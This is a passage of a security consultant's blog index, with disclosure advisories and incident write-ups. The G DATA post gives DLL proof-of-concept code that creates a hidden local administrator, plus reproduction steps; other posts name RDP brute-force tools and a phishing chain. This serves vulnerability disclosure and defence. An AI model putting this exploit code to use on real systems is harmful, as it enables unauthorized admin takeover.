=== Content from bogner.sh_bbd20e33_20250126_043629.html ===

# [#bogner.sh](https://bogner.sh)

## [G DATA Anti-Virus: Abusing OpenSSL to get local admin](https://bogner.sh/2021/10/g-data-anti-virus-abusing-openssl-to-get-local-admin/ "G DATA Anti-Virus: Abusing OpenSSL to get local admin")

 [Uncategorized](https://bogner.sh/category/uncategorized/)
 [No Responses »](https://bogner.sh/2021/10/g-data-anti-virus-abusing-openssl-to-get-local-admin/#respond)

Oct 052021

Just in case you need world-class penetration testing or security consulting services: [Bee IT Security](https://www.bee-itsecurity.at) should be your choice [German only]!

![](https://bogner.sh/wp-content/uploads/2018/12/bee_it_security.png)

This advisory is about a local privilege escalation in G Data’s Security Client “EndpointProtection Enterprise” that was first discovered in 2019. After the issues was again abused in 2021 to overtake a customer AD Domain, it was fixed by G DATA. The following blog post uses G DATA’s Security Client version 14.2.1.6 to discuss the vulnerability

![](https://bogner.sh/wp-content/uploads/2019/10/Untitled-2.png)

The underlying problem is, that the GdAgentSrv service (which is running as SYSTEM), tries to load its OpenSSL configuration from the non-existing path C:\Jenkins\vcpkg-master\packages\openssl-windows\_x86-141-static\openssl.cnf (newer versions load from C:\Jenkins\vcpkg-master\packages\openssl-windows\_x86-static\openssl.cnf).

![](https://bogner.sh/wp-content/uploads/2019/10/Untitled-3.png)

Luckily for us, we can abuse OpenSSL’s extensibility to not only load [TPM engines](https://github.com/ThomasHabets/openssl-tpm-engine/blob/master/openssl.cnf.sample), but also to inject malicious code into the GdAgentSrv process. To do that we create the previously identified openssl.cnf file at the given path and abuse the *dynamic\_path* option to specify a DLL of our choosing. Normal enduser permissions are sufficient for these actions.

![](https://bogner.sh/wp-content/uploads/2019/10/Untitled-4.png)

In this example we use the DLLMain entry point to create a new administrative user *attacker* as soon as the DLL is loaded

```

#pragma comment (lib, "User32.lib")

#include <windows.h>;

/*
	To compile 32bit dll:
	cl.exe /D_USRDLL /D_WINDLL dll.cpp /link /DLL /OUT:bad_dll.dll

	"C:\Program Files (x86)\Microsoft Visual Studio 14.0\VC\vcvarsall.bat" amd64
	cl.exe /D_USRDLL /D_WINDLL dll.cpp /link /DLL /OUT:bad_dll.dll
*/

BOOL WINAPI DllMain(
  _In_ HINSTANCE hinstDLL,
  _In_ DWORD     fdwReason,
  _In_ LPVOID    lpvReserved
) {

	system("net user attacker Batman42 /add");
	system("net localgroup Administrators attacker /add");

	return true;
}

```

After the system is rebooted (or the GdAgentSrv process is restarted) the config file is parsed and the DLL loaded. This in turn causes the new administrator to be added to the system:

![](https://bogner.sh/wp-content/uploads/2019/10/Untitled.png)
# Proof of Concept

To confirm this issue yourself install the G Data Security Client 14.2.1.6 and download the [precompiled version of the exploit files](https://bogner.sh/wp-content/uploads/2019/10/GData-LPE.zip).

After that, as a non-admin user, create the folder C:\Jenkins\vcpkg-master\packages\openssl-windows\_x86-141-static\ and place the previously downloaded files (openssl.cnf, bad\_dll.dll) therein. Now simply reboot the system. During the boot process, the new admin user *attacker* will be added. Full access to the affected endpoint has been gained.

## Mitigation

Update to the latest available version – which happens automatically anyway. Starting from 17.08.2021 the vulnerability is fixed

# Timeline

* 10.10.2019: The issue has been identified, documented and reported (ticket number CAS-730826-F7K4R9). No reply received.
* 11.2020: The issue was communicated again to G Data’s Sales Team in Austria. After initial communication no further feedback.
* 06.2021: The issues was abused during a security check to overtake another client’s infrastructure.
* 14.06.2021: G DATA confirms the vulnerability. Public disclosure is planed for 15th September 2021
* 17.08.2021: Fixed version is released to the public
* 05.10.2021: Public disclosure.

 Posted by [florian](https://bogner.sh/author/florian/) at 11:41

## [CVE-2021-35523: Local Privilege Escalation in Securepoint SSL VPN Client 2.0.30](https://bogner.sh/2021/06/local-privilege-escalation-in-securepoint-ssl-vpn-client-2-0-30/ "CVE-2021-35523: Local Privilege Escalation in Securepoint SSL VPN Client 2.0.30")

 [Security](https://bogner.sh/category/security/), [Windows](https://bogner.sh/category/windows/)
 [No Responses »](https://bogner.sh/2021/06/local-privilege-escalation-in-securepoint-ssl-vpn-client-2-0-30/#respond)

Jun 292021

*[ Preamble: A big thanks to the team at Securepoint! They immediately triaged our report and released an initial fix within days. Never forget: Every piece of software contains bugs! It depends on how you deal with them. ]*

During the audit of the Windows 10 base image of one of our clients, we discovered that they were using the free [Securepoint SSL VPN Client](https://www.securepoint.de/produkte/utm-firewalls/vpn-client.html). To be precise, version 2.0.30 – the current release as of writing – was installed.

Diese Schwachstelle wurde im Zuge eines unserer Hacking Workshops identifiziert. Mehr dazu auf unserer Webseite: [Bee IT Security](https://www.bee-itsecurity.at) – Wir machen IT Security verständlich, so dass Sie die richtigen Entscheidungen treffen können!

![](https://bogner.sh/wp-content/uploads/2018/12/bee_it_security.png)

While taking a first glance at the application, it became clear that it uses two different components: on the one hand there is the user interface (1), which is executed in the context of the current user. On the other hand there is a Windows service which is executed as SYSTEM (2). This could be quite interesting from an attacker’s point of view, in case a normal user could manipulate the backend service in any way.

![](https://bogner.sh/wp-content/uploads/2021/04/SnipImage11.jpg)

To learn more about the inner workings I used [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon). As shown in the following screenshot the user interface component *SSLVpnClient.exe* (1) uses a TCP connection to communicate with the Windows service *SPSSLVpnService.exe* (2). As discussed before, this service runs as SYSTEM. The actual VPN connection is established by *OpenVPN.exe* (3). The most interesting learning however was, that a OpenVPN configuration file, which is stored in the current users home folder, is passed as argument (4). This means, the file is fully attacker controlled.

![](https://bogner.sh/wp-content/uploads/2021/04/SnipImage23.jpg)

While reading the [OpenVPN manual](https://community.openvpn.net/openvpn/wiki/Openvpn24ManPage), I found something interesting: By using (for example) the *–tls-verify* directive from within an *\*.ovpn* configuration file, it is possible to execute arbitrary commands. Hence, I created myself a malicious VPN configuration file. As shown in the right window, it launched the *C:\Users\Public\lpe.bat* file.

![](https://bogner.sh/wp-content/uploads/2021/04/SnipImage75.jpg)

After saving the \*.*ovpn* file into a folder with the same name in *C:\Users\<username>\AppData\Roadming\Securepoint SSL VPN\config\* and restarting the SecurePoint VPN User interface, it is possible to connect to our malicious VPN.

![](https://bogner.sh/wp-content/uploads/2021/04/SnipImage79.jpg)

By doing so, the *tls-verify* script is executed as SYSTEM and a new administrative user attacker is added. Hence, a normal non-administrative user gained full control over the affected endpoint.

![](https://bogner.sh/wp-content/uploads/2021/04/SnipImage46.jpg)
## Timeline

* 14.04.2021: The vulnerability was discovered and reported to security@securepoint.de
* 15.04.2021: The report was triaged
* 26.04.2021: Securepoint SSL VPN Client Version 2.0.32 was released, which contains an initial fix for the vulnerability
* 23.06.2021: Securepoint SSL VPN Client Version 2.0.34 was released, which contains additional security measures.
* 28.06.2021: CVE-2021-35523 was assigned: <https://nvd.nist.gov/vuln/detail/CVE-2021-35523>
* 29.06.2021: Responsible disclosure in cooperation with Securepoint: <https://github.com/Securepoint/openvpn-client/security/advisories/GHSA-v8p8-4w8f-qh34>

 Posted by [florian](https://bogner.sh/author/florian/) at 07:00

## [TeslaRVNG2 meets HAFNIUM Exchange Exploit](https://bogner.sh/2021/05/teslarvng2-meets-hafnium-exchange-exploit/ "TeslaRVNG2 meets HAFNIUM Exchange Exploit")

 [Security](https://bogner.sh/category/security/)
 [No Responses »](https://bogner.sh/2021/05/teslarvng2-meets-hafnium-exchange-exploit/#respond)

May 032021

This is the story of a recent Incident Response that we – as [Bee IT Security](https://bee-itsecurity.at/) – had to deal with. The first impression was pretty clear: many of the victim’s most important servers as well as clients were encrypted. One of the domain controllers also showed a ransom note which is never good sign. After a quick glance at the Window title, it was pretty clear that we had to deal with TeslaRVNG2 (anonymised screenshot from a sandbox):

![](https://bogner.sh/wp-content/uploads/2021/05/Screenshot-1.png)

In contrast to REvil or DoppelPaymer there is not much information available about common TeslaRVNG2 TTPs. Hence, we started by analysing one of the encrypted clients with the goal of identifying the internal source of the attack. Thereby we found the following Logon Event (Event id 4624) which documents that the actual Domain Administrator logged on to the now encrypted PC. That event was created in the middle of the night (local time) and just a few hours before the last modified date of the encrypted files. Additionally, all the IT employees use named administrative accounts, which means this logon was caused by the attackers. The source was one of the company’s domain controllers.

![](https://bogner.sh/wp-content/uploads/2021/05/Screenshot-2021-05-02-at-19.13.36.png)

A few seconds after that first logon, the Anti-Virus service was killed as well. Another clear indication that this activity was caused by the criminals.

## The Domain Controller

Hence, we now focused our analysis on the domain controller that was logged as the source of the login. After taking a snapshot, we captured our live response data and waited for the parsing to finish. During that time, I was curious and took a quick glance at the Windows directory. Multiple files caught my attention: MEMORY.dmp, msmpene.exe , …

![](https://bogner.sh/wp-content/uploads/2021/05/3_EXE-in-Windows.jpg)

More interesting stuff was located in inetsrv (*C:\Windows\System32\inetsrv*\). Is this server also the victim’s Exchange Server? Can you already guess what has happened?

![](https://bogner.sh/wp-content/uploads/2021/05/5_inetsrv-1.jpg)

Maybe we start by taking a closer look at *c.ps1*. As shown below *certutil* is abused to download additional payloads. For example, *m6.exe* is a Bitcoin Miner and *dn.ps1* established as backdoor. What immediately confirmed my initial guess: There are many activities (*echo* commands) that suggest that the HAFNIUM Exchange vulnerabilities were part of the attack.

![](https://bogner.sh/wp-content/uploads/2021/05/2_Script-1.jpg)

After talking to the system administrators this guess was confirmed. There were issues with installing the latest Exchange CU, which caused the server to be vulnerable for the critical vulnerabilities for too long.

## The TeslaRVNG2 Cryptolocker

So we now know how the attackers got initial access. But let’s focus on the actual cryptolocker (*msmpene.exe*). By executing the sample in a sandbox, we identified a plaintext log file that was masked as a DLL (*msvsc.dll*). This file gave us a good understanding about what has happened:

![](https://bogner.sh/wp-content/uploads/2021/05/Screenshot-2021-05-02-at-19.44.31.png)

After the malware was launched (0) a network scan is started (1). Based on the observed behaviour we conclude that the IP range is derived from the current IP. However, the malware always used a /24 network here. So, if your company uses multiple subnets, this ransomware will not affect all of them. Again: please implement a network segmentation with a firewall in between!

In a separate thread the local disc is encrypted (2). During that process the original filenames are kept, making it more difficult for end-users to detect the ongoing attack.

For all identified hosts on the network (3) the access level is checked. If admin privileges are available different techniques are used to stop installed anti-virus solutions. After that all shares (4) are encrypted (5). So, there is no “real” lateral movement. The ransomware simply abuses Windows file sharing.

As soon as the local disc was fully encrypted the renaming process was started (6) (*original.txt => id[\*\*\*\*\*\*\*\*].[contact@domain.com].original.txt.teslarvng2*) and the ransom notes (7) are placed.

By comparing the victim’s log with the log of a fully encrypted system we can conclude that the process was interrupted. As shown below, if everything is finished the malware prints “the end :L”. That entry however is missing in the customer’s log.

![](https://bogner.sh/wp-content/uploads/2021/05/Picture-1.png)

Luckily a working backup was available, and the infrastructure could be rebuilt within days! No ransom was paid.

## IOCs

| **Type** | **Description** | **IOC** |
| --- | --- | --- |
| Hash | c.ps1 | c1bb24572db470c07ece739b889032ad9ab28e4d |
| Hash | msmpene.exe | e365a6acd90eb50ddc067790845b6ade0e1034ed |
| Hash | msmpene86.exe | dd9089097c559b1addbefd37b2da0e4bc2334244 |
| Hash | bd.bat | 7ad79e9e92346c425aa2b2ca1caeb64c33451a8d |
| Hash | svchost.exe | 630814297fc44d6df895e60490c57955cad3db31 |
| Host |  | t.hwqloan.com |
| Path |  | C:\inetpub\wwwroot\aspnet\_client\js\demo\wanlins.aspx |
| Path |  | C:\inetpub\wwwroot\aspnet\_client\js\demo\wanlin.txt |
| Hash | dns.ps1 | 0165405f79d402baec05078c4b4559f400a826f5 |
| Hash | m6.exe | 8f72a1e1faf496c05852338dd72aea868aa0f835 |

 Posted by [florian](https://bogner.sh/author/florian/) at 05:00

## [Dirty Offline Bulk IP Geolocation](https://bogner.sh/2021/01/dirty-offline-bulk-ip-geolocation/ "Dirty Offline Bulk IP Geolocation")

 [Security](https://bogner.sh/category/security/), [Tools](https://bogner.sh/category/tools/), [Uncategorized](https://bogner.sh/category/uncategorized/)
 [No Responses »](https://bogner.sh/2021/01/dirty-offline-bulk-ip-geolocation/#respond)

Jan 192021

As of recently, I quite often receive Excel files with hundreds of IPs which need to be geolocated ([Can you guess where they come from](https://docs.microsoft.com/en-us/microsoft-365/compliance/search-the-audit-log-in-security-and-compliance?view=o365-worldwide)?). Sure, I could import them into our Elastic stack, but would that post then be titled “Dirty”?

So we need to come up with a different solution. While researching the topic, the first thing that became clear was that I need an offline solution. Although most of the time I just try to locate a handful of addresses, but this sometimes explodes to up to 5.000. In that case, it is almost impossible to find a suitable web API. The most generous free services only provide up to 1.000 lookups per week.

Luckily there is [MaxMind](https://www.maxmind.com/). They are the company behind GeoIP, which also offers a free offline database. Simple register for an [account on their website](https://www.maxmind.com/en/geolite2/signup).

![](https://bogner.sh/wp-content/uploads/2021/01/Screenshot-2021-01-18-at-20.13.02.png)

[Then access your account](https://www.maxmind.com/en/account/login) and select “Download Files” in the left menu. From the list, select the “GeoLite2 City” database file. It’s important to use the GeoIP2 Binary format.

![](https://bogner.sh/wp-content/uploads/2021/01/Screenshot-2021-01-18-at-20.15.11.png)

Finally, it’s time to get dirty: Download the script [dirtyiplocate.py](https://github.com/fbogner/dirtyiplocate/blob/main/dirtyiplocate.py) from Github or clone the whole repository. After that, the geoip2 modules needs to be installed (*pip install geoip2*).

![](https://bogner.sh/wp-content/uploads/2021/01/Screenshot-2021-01-18-at-20.19.41.png)

After all that hard work, *dirtyiplocate.py* is ready to rumble. As shown in the following screenshot it’s pretty easy to use. Provide a text file with IPs you want to locate (the *–ips* argument) and specify the output CSV file (the *–output* parameter). In case you want the results to be appended to the output file instead of overwriting it, the *–append* argument can be used.

![](https://bogner.sh/wp-content/uploads/2021/01/Screenshot-2021-01-18-at-20.22.50.png)

The following screenshot shows the output of *dirtyiplocate.py*. Excel’s [VLOOKUP](https://support.microsoft.com/en-us/office/vlookup-function-0bbc8083-26fe-4963-8ab8-93a18ad188a1) can now be used to incorporate this data into existing lists. Please always use the datatype TEXT for IP addresses. Otherwise a unicorn dies!

![](https://bogner.sh/wp-content/uploads/2021/01/Screenshot-2021-01-18-at-20.31.40.png)

To summaries: I built a dirty script that can be used to do bulk IP geolocation. It can be downloaded here: <https://github.com/fbogner/dirtyiplocate>

 Posted by [florian](https://bogner.sh/author/florian/) at 05:59

## [Egregor Post-Incident Monitor / Protector Script](https://bogner.sh/2020/12/egregor-post-incident-monitor-protector-script/ "Egregor Post-Incident Monitor / Protector Script")

 [Uncategorized](https://bogner.sh/category/uncategorized/)
 [No Responses »](https://bogner.sh/2020/12/egregor-post-incident-monitor-protector-script/#respond)

Dec 072020

During a recent Incident Response Assignment we at [Bee IT Security](https://bee-itsecurity.at) had to cope with a large Egregor attack. Many of our client’s most critical systems had been encrypted. Luckily, we were able to recover most of them from Offline backups.

However, we were unsure if (I) all encrypted systems had been identified and (II) if no further Egregor activities would trigger. Based on a great article from [Cybereason](https://www.cybereason.com/blog/cybereason-vs-egregor-ransomware) and our own investigations, we knew how the infection was carried out: A Powershell script was used to deploy a malicious DLL to all systems, which was then executed using WMI.

To answer both of our questions, I wrote a small PowerShell script, which checks the current system for the ransom note (I). Additionally the presence of the malicious DLL is checked and logged (II). To hinder further Egregor activity with the same library, a placeholder file is generated and protected with NTFS filesystem permissions (Everyone : Full Control : Deny). A GPO with a Scheduled Task was used to run it on all systems on an hourly base.

![](https://bogner.sh/wp-content/uploads/2020/12/Screenshot-2020-12-07-at-22.12.53.png)

In case you also have the pleasure to meet Egregor, you may find our script handy. You can download it here: <https://gist.github.com/fbogner/32fc8b73bcc50287ced91de1883421a9>

 Posted by [florian](https://bogner.sh/author/florian/) at 21:14

## [IT Security “Hausmittel”](https://bogner.sh/2020/11/it-security-hausmittel/ "IT Security “Hausmittel”")

 [Security](https://bogner.sh/category/security/)
 [No Responses »](https://bogner.sh/2020/11/it-security-hausmittel/#respond)

Nov 162020

Erfahrungsgemäß sind IT Security Maßnahmen häufig schwierig zu implementieren und verursachen beträchtliche Kosten. Im Zuge unserer Tätigkeit als Security Consultants und Pentester haben wir aber einige Wege erarbeitet, wie einfach und kosteneffizient der Security Level der Infrastruktur erheblich verbessert werden kann.

Die 10 wichtigen „IT Security Hausmittel“ haben wir dazu in einem entsprechenden Whitepaper zusammengefasst.

Im Detail werden dabei drei unterschiedliche Maßnahmen-Kategorien empfohlen:

1. **Infektion**
   Um die Initiale Infektion von Endgeräten zu erschweren, werden Tipps zur Absicherung von gefährlichen Datentypen, Office Makros und PowerShell aufgezeigt
2. **Ausbreitung**
   Der Missbrauch von privilegierten Benutzerkonten ist häufig bei Attacken zu beobachten. Dementsprechend ist es entscheidend diese zu schützen. Einfache Gruppenrichtlinien, wie die Nutzung der PPL Technologie für den lsass.exe Prozess oder die automatische Abmeldung von administrativen Konten helfen digitale Angriffe erheblich zu erschweren.
3. **Compliance**
   Viele Unternehmen kämpfen auch immer noch mit Basistechnologien wie beispielsweise der Festplattenverschlüsselung. Wiederum mit einer Gruppenrichtlinie ist die Aktivierung dieser über BitLocker einfach möglich.

Das Whitepaper mit diesen und vielen weiteren Empfehlungen können Sie kostenlos unter folgender Webadresse herunterladen:

[![](https://bogner.sh/wp-content/uploads/2020/07/Screenshot-2020-07-06-at-10.18.23.png)](https://bee-itsecurity.at/downloads/IT%20Security%20Hausmittel)

Wir als Bee IT Security machen IT Security verständlich, so dass Sie die richtigen Entscheidungen treffen können. Unser Portfolio umfasst: Workshops, Penetration Tests, simuliertes Phishing. Wir freuen uns auf Ihre Kontaktaufnahme unter office@bee-itsecurity.at

 Posted by [florian](https://bogner.sh/author/florian/) at 10:15

## [Sicheres Client Admin Konzept](https://bogner.sh/2020/07/sicheres-client-admin-konzept/ "Sicheres Client Admin Konzept")

 [Uncategorized](https://bogner.sh/category/uncategorized/)
 [No Responses »](https://bogner.sh/2020/07/sicheres-client-admin-konzept/#respond)

Jul 062020

Bei vielen der von [Bee IT Security](https://bee-itsecurity.at/) durchgeführten Hacking Workshops (aka Infrastruktur Pentests) stellen wir fest, dass es erhebliche IT Security Defizite in der Handhabung von administrativen Konten gibt. Dies betrifft vor allem das dauerhafte Arbeiten mit administrativen Berechtigungen und die Mehrfachverwendung von Passwörtern für lokale Benutzer.

Das problematisch daran ist, dass bei praktisch jedem IT Angriff der letzten Monate und Jahre der Missbrauch privilegierter Konten ein wichtiger Baustein der Attacke war. Sei es der Hack der [ÖVP](https://futurezone.at/netzpolitik/oevp-hack-ermittlungen-werfen-neue-fragen-auf/400636748), der Angriff auf den [Heise Verlag](https://www.heise.de/ct/artikel/Trojaner-Befall-Emotet-bei-Heise-4437807.html), der [Emotet Befall im Kammergericht Berlin](https://www.heise.de/newsticker/meldung/Emotet-Berliner-Kammergericht-bleibt-bis-2020-weitgehend-offline-4569544.html) oder die [Ausbreitung im A1 Netzwerk](https://blog.haschek.at/2020/the-a1-telekom-hack.html).

Daher haben wir gemeinsam mit einigen ausgewählten Kunden (500 – 5.000 Mitarbeiter) ein Client Admin Konzept erarbeitet, welches auch wirklich für die IT Abteilung lebbar ist! Wir haben dabei versucht wirklich alle relevanten Szenarien abzubilden, darunter fällt u.a.:

* Wie führen sichere Remote-Unterstützung für Benutzer (Remote Assistance) durch?
* Wie können neue Programme am Endgerät installiert bzw. Probleme behoben werden?
* Wie können Recovery Aufgaben nach dem Verbindungsverlust zur Domäne noch durchgeführt werden?
* Gibt es weiterhin die Möglichkeit psexec o.ä. zu verwenden?

Daraus entstanden ist ein sechsseitiges Dokument, was die Gefahren der hier beschriebenen Worksflows beschreibt und entsprechende Lösungsvorschläge beinhaltet.

![](https://bogner.sh/wp-content/uploads/2020/07/Screenshot-2020-07-06-at-10.34.31.png)

Durch Umsetzung dieser Prozesse kann ein erheblicher Sicherheitsmehrwert in Richtung eines “Zero Trust” Ansatzes für Clients erreicht werden. Ziel muss sein, dass die Kompromittierung eines Rechners nicht sofort zum Domänen Administrator führt! Dies ist nämlich leider öfter möglich, als man denkt… Vielleicht auch bei Ihnen?

**Daher:** Laden Sie sich unser Whitepaper “Sicheres Client Admin Konzept” herunter und profitieren Sie von unserem Know-How!

[![](https://bogner.sh/wp-content/uploads/2020/07/Screenshot-2020-07-06-at-10.18.23.png)](https://bee-itsecurity.at/downloads/Sicheres%20Client%20Admin%20Konzept)
Wenn Sie Unterstützung bei Umsetzung der hier beschriebenen Maßnahmen benötigen, oder allgemein Ihre IT besser absichern wollen: [Bee IT Security](https://www.bee-itsecurity.at) – Wir machen IT Security verständlich, so dass Sie die richtigen Entscheidungen treffen können!

![](https://bogner.sh/wp-content/uploads/2018/12/bee_it_security.png)

 Posted by [florian](https://bogner.sh/author/florian/) at 08:37

## [Oh nein: Unser Honeypot ist verschlüsselt ;-)](https://bogner.sh/2020/04/oh-nein-unser-honeypot-ist-verschlusselt/ "Oh nein: Unser Honeypot ist verschlüsselt ;-)")

 [Security](https://bogner.sh/category/security/)
 [No Responses »](https://bogner.sh/2020/04/oh-nein-unser-honeypot-ist-verschlusselt/#respond)

Apr 062020

Wir als [Bee IT Security](https://bee-itsecurity.at/) unterstützten unsere Kunden tatkräftig bei der Absicherung Ihrer Infrastrukturen. Dabei ist es aber natürlich auch unerlässlich die Taktiken der Angreifer zu kennen und zu verstehen. Genau deshalb betreiben wir auch eigene Honeypots: absichtlich anfällige Server im Internet, die von Kriminellen gekapert werden können. Ziel ist es, deren Aktionen aufzuzeichnen, zu analysieren und schlussendlich sicherzustellen, dass die eigenen Absicherungsmaßnahmen die Angriffe abgewehrt hätten.

Mein Lieblings-Honeypot hört auf den Namen “MXB System” und ist mittels des Benutzernamen *admin* und dem absolut sicheren Passwort *admin* direkt aus dem Internet per RDP erreichbar. Für das Monitoring setzen wir eine Vielzahl unterschiedlicher Technologien ein:

![](https://bogner.sh/wp-content/uploads/2020/04/Screenshot-2020-04-05-at-19.46.58.png)

Mit [Sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon) protokollieren wir alle Prozessstarts, Datei- und Registryänderungen aber auch jeglichen Netzwerkverkehr. Der [Blackcat Keylogger](https://0x00sec.org/t/blackcat-keylogger/10307) zeichnet zusätzliche alle Tastatureingaben auf. Da viele Cyberangriffe auf Powershell aufbauen, [werden diese Befehle auch geloggt](https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html). Damit wir sofort bescheid wissen, sobald unser Honeypot attackiert wird, haben wir unser Microsoft Teams integriert, wodurch [Live Notifications](https://docs.microsoft.com/en-us/microsoftteams/platform/webhooks-and-connectors/how-to/connectors-using#setting-up-a-custom-incoming-webhook) möglich werden. Um das Vorgehen der Kriminellen besser zu verstehen, haben wir an unterschiedlichen Stellen im Dateisystem auch Fake Inhalte platziert. Alle Aktivitäten der RDP Sitzung werden mit [FFmpeg](https://www.ffmpeg.org/) auch als Video aufgezeichnet. Und genau darum geht es in diesem Blogeintrag!

Im Folgenden finden Sie ein Video, das die Verschlüsselung unseres Honeypots und das Vorgehen der Kriminellen im Detail zeigt. Besonders spannend daran ist jedoch, dass zuvor der komplette Rechner analysiert und auch Lateral Movement versucht wird. Also gleich ansehen:

Bei der vom Angreifer verwendeten Cryptolocker Schadsoftware handelt es sich übrigens um Standardkomponenten: CrySIS. Diese wird sehr oft in der von uns beobachteten Form per RDP Bruteforcing in Unternehmensnetzwerke eingeschleust. Siehe dazu auch das wirklich gelungene [Threat Spotlight von Malwarebytes](https://blog.malwarebytes.com/threat-analysis/2019/05/threat-spotlight-crysis-aka-dharma-ransomware-causing-a-crisis-for-businesses/).

Das hier eingesetzte Sample war übrigens schon von praktisch allen Virenscannern als bösartig eingestuft. Da die Infektionen aber manuell stattfindet, werden die installierten Virenscanner einfach deaktiviert.

![](https://bogner.sh/wp-content/uploads/2020/04/Screenshot-2020-02-13-at-13.17.44.png)

In unserem Fall wäre ein Zahlung von 3.000€ von den Angreifern gefordert worden. Leider kann man sich jedoch oft nicht auf die Aussagen der Kriminellen verlassen. Wird die initiale Forderung beglichen, kann es passieren, dass das Lösegeld noch einmal erhöht wird:

![](https://bogner.sh/wp-content/uploads/2020/04/Untitled.png)
## Wie bricht man in RDP Server ein?

Um überhaupt in unseren Honeypot einzubrechen, kann beispielsweise Masscan und RDP Brute verwendet werden. Im ersten Schritt werden dabei mittels der in [Masscan](http://toolshacke.blogspot.com/2016/12/masscan-gui-windows.html) hinterlegten Länder IP Ranges öffentlich erreichbare RDP Server gesucht. Der eigentliche Einbruchsversuch kann anschließend mit [RDP Brute](https://hack-nesia.blogspot.com/2016/07/rdp-brute-coded-by-z668.html) oder NL Brute durchgeführt werden. Beide Tools ermöglichen Wörterbuchangriffe auf schwache Benutzerpasswörter:

![](https://bogner.sh/wp-content/uploads/2020/04/Screenshot-2020-04-05-at-20.02.05.png)

Viele der so gekaperten Rechner werden nicht nur verschlüsselt, sondern auch auf Plattformen wie dedic.top für wenig Geld weiterverkauft. Als Käufer kann man hier komfortabel auf den Serverstandort, Admin Rechte und “Entdeckungsrisiko” filtern. Sollte der so gekaufte “Dedic” vom eigentlichen Besitzer gesperrt worden sein, gibt es natürlich kostenlos Ersatz.

![](https://bogner.sh/wp-content/uploads/2020/04/Screenshot-2020-04-05-at-20.18.55.png)
## Wie kann ich mich schützen?

IT Security muss nicht immer teuer sein! Ganz im Gegenteil, ein guter Basisschutz reicht in vielen Fällen bereits aus, um Cyberangriffe zu verhindern – so auch hier.

### **RDP nicht direkt im Internet publizieren & Multi-Faktor Authentifizierung**

Es sollte immer ein Remote Desktop Gateway verwendet werden, der zusätzliche Sicherheitsfunktionen bereitstellt. Besonders wichtig ist hier der zweite Authentifizierungsfaktor z.B. per Smartphone-App für Remotezugriffe.

### **Verwenden Sie Lockout Policies**

Unser Honeypot wird primär durch Wörterbuchangriffe übernommen. Leider mussten wir auch bereits einige echte Incidents nach Einbrüchen über RDP bearbeiten. Durch die Nutzung einer Lockout Policy hätten viele verhindert werden können.

### **Mitarbeiter Awareness**

Alleine durch Technik ist es nicht möglich die eigene Organisation ausreichend zu schützen! Entscheidend ist die Mitarbeiter auf die Bedrohungen durch Cyberkriminalität zu schulen. Wir können hier unseren Partner [nextbeststep](https://www.nextbeststep.at/) nur wärmstens empfehlen!

### **IT Systeme härten** (“Hacking Workshops”)

Es gibt noch viele weitere einfache Tricks, wie das eigene Netzwerk noch besser gegen Angriffe abgesichert werden kann. Dies lassen sich am Besten im Zuge von “Hacking Workshops” vermitteln. In unseren geführten Security Audits hacken wir gemeinsam mit Ihrer IT Abteilung die eigene Infrastruktur und erarbeiten anschließend gemeinsam entsprechende Absicherungsmaßnahmen. Dieses Vorgehen bringt einen langfristigen IT Security Mehrwert in der IT Abteilung und hilft sofort wichtige Absicherungsmaßnahmen umzusetzen. Das besondere: Wir helfen gleich bei der Implementierung mit – das ganze ohne eigenes Produkt-Portfolio.

Bei Fragen zu diesem Artikel oder unseren Hacking Workshops, senden Sie mir am Besten eine Mail an: florian [@] bee-itsecurity.at

 Posted by [florian](https://bogner.sh/author/florian/) at 00:30

## [Phishing auf der Schulter von Riesen](https://bogner.sh/2020/01/phishing-auf-der-schulter-von-riesen/ "Phishing auf der Schulter von Riesen")

 [Security](https://bogner.sh/category/security/)
 [No Responses »](https://bogner.sh/2020/01/phishing-auf-der-schulter-von-riesen/#respond)

Jan 082020

Aktuell gibt es im deutschsprachigen Raum eine neue Phishing Welle, die es vor allem auf Office 365 Konten absieht. Das besondere daran: die Office 365 Infrastruktur ist selbst Teil der Attacke.

Leider erscheint die neue Taktik aber auch sehr gut zu funktionieren. Wir haben mittlerweile mehrere Kunden die mit entsprechend kompromittierten Konten konfrontiert sind. Über das Microsoft 365 Admin Center und den [Audit Log Search](https://protection.office.com/unifiedauditlog) ist es im Fall der Fälle aber relativ gut möglich die Größe der Infektion zu erkennen und entsprechende Gegenmaßnahmen (Passwort Resets; Meldung bei DSB) einzuleiten.

Aber zurück zur eigentlichen Attacke. Im Folgenden werden wir ein anonymisiertes Beispiel verwenden, um die verschiedenen Teilschritte zu analysieren.

## Das Phishing Mail

Als Eintrittspunkt in die Organisation werden meist legitim aussehende Phishing Mails, wie das Folgende eingesetzt. Das gemeine daran: Beim Absender handelt es sich um ein echte Firma, der richtigen Firmendomäne und der passenden Signatur. Nur der Inhalt der Nachricht könnte zum Nachdenken anregen.

![](https://bogner.sh/wp-content/uploads/2020/01/Screenshot-2020-01-08-at-17.13.57.png)
## Die Landing Page

Aber hier kommt schon der nächste Trick der Angreifer: der eingebettete Link zeigt auf einen bereits vorab gekaperten Account auf Office 365. In diesem Fall auf eine OneNote Notiz. Dies erschwert es einerseits den technischen Schutzmaßnahmen, da die Microsoft Domänen ein hohes Vertrauen genießen. Andererseits kennen auch die Anwender Microsoft als “sicheres” Unternehmen.

![](https://bogner.sh/wp-content/uploads/2020/01/Screenshot-2020-01-08-at-17.17.47.png)

Neben OneNote werden aber auch noch andere Produkte, wie beispielsweise Sway von den Angreifern eingesetzt:

![](https://bogner.sh/wp-content/uploads/2020/01/Screenshot-2020-01-08-at-17.42.17.png)

Das heißt, die Kriminellen missbrauchen das komplette Office 365 Portfolio. Das Schema ist aber immer das gleiche: das potentielle Opfer soll einem Link auf eine Drittseite folgen.

*Besonders perfide: Kann der eigene Account gekapert werden, wird auch dieser in Phishing Angriffen eingesetzt!*

## Die eigentliche Phishing Seite

Klickt der Endanwender tatsächlich auf den Link, landet er/sie auf der eigentlichen Phishing Seite. Hier sind die Angreifer nicht wählerisch und bieten viele verschiedene “Anmeldeverfahren” an. Der Benutzer kann selbst auswählen welche Zugangsdaten er/sie preisgeben möchte.

![](https://bogner.sh/wp-content/uploads/2020/01/Screenshot-2020-01-08-at-17.18.07.png)

Wird beispielsweise Office 365 selektiert, erscheint eine der echten Microsoft Loginseite nachempfundene Anmeldemaske.

![](https://bogner.sh/wp-content/uploads/2020/01/Screenshot-2020-01-08-at-17.18.12.png)
## Das Finale

